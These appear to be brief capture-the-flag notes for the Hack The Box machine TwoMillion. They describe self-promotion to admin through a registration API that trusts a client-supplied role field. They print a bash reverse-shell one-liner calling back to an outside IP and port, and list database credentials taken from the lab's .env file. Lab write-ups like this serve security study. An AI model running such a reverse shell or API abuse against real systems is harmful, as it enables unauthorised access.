# HTB - TwoMillion

#HTB #TwoMillion #API #IDOR #PrivEsc #Web

## Findings

- **API privilege escalation** — complete the signup flow, then promote your own account to admin through the API rather than the UI. The registration endpoints trust a client-supplied role/admin field.

## Foothold

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.183/9001 0>&1'
```

## Creds

Recovered from the application `.env`:

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

> [!note] The original notes recorded no scan output, no IP, and no privesc path — only the API-abuse summary, the reverse shell, and the `.env` contents above. Treat this as a partial record.
